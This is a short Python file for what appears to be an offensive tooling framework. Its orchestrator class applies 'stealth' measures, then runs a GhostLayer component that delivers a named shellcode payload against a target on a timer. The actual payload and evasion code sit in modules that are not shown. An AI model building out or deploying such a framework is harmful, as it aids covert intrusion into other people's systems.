import logging
from ghost_layer import GhostLayer
from black_vault import BlackVault
from agents.stealth_manager import StealthManager
from typing import Optional

# --- Orchestrator for GhostLayer, BlackVault, StealthManager integration ---
class GhostStealthOrchestrator:
    def __init__(self, vault_password: Optional[str] = None):
        self.logger = logging.getLogger("GhostStealthOrchestrator")
        self.vault = BlackVault(password=vault_password)
        self.stealth = StealthManager()
        self.ghost = GhostLayer(vault=self.vault, logger=logging.getLogger("GhostLayer"))

    def run_ghost_with_stealth(self, target=None, shellcode_name="ghost_payload", interval=60):
        self.logger.info("Applying stealth techniques before GhostLayer run...")
        self.stealth.apply_stealth()
        self.logger.info("Stealth applied. Running GhostLayer...")
        try:
            self.ghost.run(target=target, shellcode_name=shellcode_name, interval=interval)
        finally:
            self.logger.info("GhostLayer run complete. Re-applying stealth for cleanup...")
            self.stealth.apply_stealth()
